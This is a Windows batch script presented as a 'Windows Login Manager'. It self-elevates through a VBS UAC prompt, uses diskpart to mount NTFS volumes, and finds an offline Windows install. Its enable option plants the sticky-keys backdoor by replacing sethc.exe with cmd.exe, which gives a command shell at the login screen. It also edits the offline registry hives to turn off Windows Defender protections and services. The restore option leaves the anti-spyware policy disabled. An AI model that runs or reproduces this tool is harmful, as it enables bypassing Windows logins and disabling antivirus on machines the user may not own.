@echo off
setlocal EnableDelayedExpansion

rem Ask for admin privileges
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive%  1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/c cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )

rem Why repeat the code? The fucking for is not working... I'll fix it one day!
rem I hope you have not more than 5 NFTS partitions....

rem Run diskpart to get volume information
echo sel disk 0 > diskpart_commands.txt
echo list volume >> diskpart_commands.txt

diskpart /s diskpart_commands.txt > diskpart_output.txt

rem Array of allowed drive letters
set "allowedDriveLetters=P Q R S T U V W"

rem Parse diskpart output to find NTFS volumes and assign a letter
for /f "tokens=2" %%a in ('findstr /C:"NTFS" diskpart_output.txt') do (
    rem Generate random index
    set /a "index=!random! %% 8"

    rem Get the drive letter from the array
    for /f "tokens=1,2* delims= " %%b in ('echo !allowedDriveLetters!') do (
        set "driveLetter=%%b"
        set "allowedDriveLetters=%%c %%d %%e %%f %%g %%h %%i"
    )

    echo Assigning drive letter !driveLetter! to volume %%a

    rem Assign drive letter using diskpart
    echo select volume %%a > diskpart_assign.txt
    echo assign letter=!driveLetter! >> diskpart_assign.txt
    diskpart /s diskpart_assign.txt
)

rem Run diskpart to get volume information
echo sel disk 1 > diskpart_commands.txt
echo list volume >> diskpart_commands.txt

diskpart /s diskpart_commands.txt > diskpart_output.txt

rem I need to implement a check with findstring to use the next letter if the one is not avaiable

rem Array of allowed drive letters
set "allowedDriveLetters=P Q R S T U V W"

rem Parse diskpart output to find NTFS volumes and assign a letter
for /f "tokens=2" %%a in ('findstr /C:"NTFS" diskpart_output.txt') do (
    rem Generate random index
    set /a "index=!random! %% 8"

    rem Get the drive letter from the array
    for /f "tokens=1,2* delims= " %%b in ('echo !allowedDriveLetters!') do (
        set "driveLetter=%%b"
        set "allowedDriveLetters=%%c %%d %%e %%f %%g %%h %%i"
    )

    echo Assigning drive letter !driveLetter! to volume %%a

    rem Assign drive letter using diskpart
    echo select volume %%a > diskpart_assign.txt
    echo assign letter=!driveLetter! >> diskpart_assign.txt
    diskpart /s diskpart_assign.txt
)

rem Run diskpart to get volume information
echo sel disk 2 > diskpart_commands.txt
echo list volume >> diskpart_commands.txt

diskpart /s diskpart_commands.txt > diskpart_output.txt

rem Array of allowed drive letters
set "allowedDriveLetters=P Q R S T U V W"

rem Parse diskpart output to find NTFS volumes and assign a letter
for /f "tokens=2" %%a in ('findstr /C:"NTFS" diskpart_output.txt') do (
    rem Generate random index
    set /a "index=!random! %% 8"

    rem Get the drive letter from the array
    for /f "tokens=1,2* delims= " %%b in ('echo !allowedDriveLetters!') do (
        set "driveLetter=%%b"
        set "allowedDriveLetters=%%c %%d %%e %%f %%g %%h %%i"
    )

    echo Assigning drive letter !driveLetter! to volume %%a

    rem Assign drive letter using diskpart
    echo select volume %%a > diskpart_assign.txt
    echo assign letter=!driveLetter! >> diskpart_assign.txt
    diskpart /s diskpart_assign.txt
)

rem Run diskpart to get volume information
echo sel disk 3 > diskpart_commands.txt
echo list volume >> diskpart_commands.txt

diskpart /s diskpart_commands.txt > diskpart_output.txt

rem Array of allowed drive letters
set "allowedDriveLetters=P Q R S T U V W"

rem Parse diskpart output to find NTFS volumes and assign a letter
for /f "tokens=2" %%a in ('findstr /C:"NTFS" diskpart_output.txt') do (
    rem Generate random index
    set /a "index=!random! %% 8"

    rem Get the drive letter from the array
    for /f "tokens=1,2* delims= " %%b in ('echo !allowedDriveLetters!') do (
        set "driveLetter=%%b"
        set "allowedDriveLetters=%%c %%d %%e %%f %%g %%h %%i"
    )

    echo Assigning drive letter !driveLetter! to volume %%a

    rem Assign drive letter using diskpart
    echo select volume %%a > diskpart_assign.txt
    echo assign letter=!driveLetter! >> diskpart_assign.txt
    diskpart /s diskpart_assign.txt
)

rem Run diskpart to get volume information
echo sel disk 4 > diskpart_commands.txt
echo list volume >> diskpart_commands.txt

diskpart /s diskpart_commands.txt > diskpart_output.txt

rem Array of allowed drive letters
set "allowedDriveLetters=P Q R S T U V W"

rem Parse diskpart output to find NTFS volumes and assign a letter
for /f "tokens=2" %%a in ('findstr /C:"NTFS" diskpart_output.txt') do (
    rem Generate random index
    set /a "index=!random! %% 8"

    rem Get the drive letter from the array
    for /f "tokens=1,2* delims= " %%b in ('echo !allowedDriveLetters!') do (
        set "driveLetter=%%b"
        set "allowedDriveLetters=%%c %%d %%e %%f %%g %%h %%i"
    )

    echo Assigning drive letter !driveLetter! to volume %%a

    rem Assign drive letter using diskpart
    echo select volume %%a > diskpart_assign.txt
    echo assign letter=!driveLetter! >> diskpart_assign.txt
    diskpart /s diskpart_assign.txt
)

rem Run diskpart to get volume information
echo sel disk 5 > diskpart_commands.txt
echo list volume >> diskpart_commands.txt

diskpart /s diskpart_commands.txt > diskpart_output.txt

rem Array of allowed drive letters
set "allowedDriveLetters=P Q R S T U V W"

rem Parse diskpart output to find NTFS volumes and assign a letter
for /f "tokens=2" %%a in ('findstr /C:"NTFS" diskpart_output.txt') do (
    rem Generate random index
    set /a "index=!random! %% 8"

    rem Get the drive letter from the array
    for /f "tokens=1,2* delims= " %%b in ('echo !allowedDriveLetters!') do (
        set "driveLetter=%%b"
        set "allowedDriveLetters=%%c %%d %%e %%f %%g %%h %%i"
    )

    echo Assigning drive letter !driveLetter! to volume %%a

    rem Assign drive letter using diskpart
    echo select volume %%a > diskpart_assign.txt
    echo assign letter=!driveLetter! >> diskpart_assign.txt
    diskpart /s diskpart_assign.txt
)

FOR %%w IN (P Q R S T U V W ) DO IF EXIST %%w:\PerfLogs set SYSPART=%%w:
echo "%SYSPART%"

if "%SYSPART%"=="" (
    echo "No Windows installations detected!"
    echo "Maybe your windows is encrypted?"
    pause
    exit
) else (
    echo %SYSPART%
)

:MAINMENU
SET MENU=
ECHO WINDOWS LOGIN MANAGER
echo.
ECHO [1] Enable admin on login page
ECHO [2] Disabling admin on login page
echo.
SET /P MENU=Type 1, 2 or 0 then press ENTER :
IF /I '%MENU%'=='1' GOTO :ENABLE
IF /I '%MENU%'=='2' GOTO :DISABLE
GOTO :MAINMENU

:ENABLE
copy /y "sticky_run.bat" "%SYSPART%\windows\system32"
copy /y "sticky.bat" "%SYSPART%\windows\system32"
move "%SYSPART%\windows\system32\sethc.exe" "%SYSPART%\windows\system32\sethc.exe.bak"
copy /y "%SYSPART%\windows\system32\cmd.exe" "%SYSPART%\windows\system32\sethc.exe"

rem disable defender
reg load "HKLM\temp-hive" "%SYSPART%\windows\system32\config\SOFTWARE"
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f
reg unload "HKLM\temp-hive"

reg load "HKLM\temp-hive" "%SYSPART%\windows\system32\config\SYSTEM"
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d 4 /f
reg unload "HKLM\temp-hive"

echo "Completed"
pause
exit

:DISABLE
del "%SYSPART%\windows\system32\sticky_run.bat"
del "%SYSPART%\windows\system32\sticky.bat"
del "%SYSPART%\windows\system32\sethc.exe"
move /y "%SYSPART%\windows\system32\sethc.exe.bak" "%SYSPART%\windows\system32\sethc.exe"

rem enable defender
reg load "HKLM\temp-hive" "%SYSPART%\windows\system32\config\SOFTWARE"
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 0 /f
reg unload "HKLM\temp-hive"

reg load "HKLM\temp-hive" "%SYSPART%\windows\system32\config\SYSTEM"
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d 2 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d 2 /f
reg unload "HKLM\temp-hive"

echo "Completed"
pause
exit

endlocal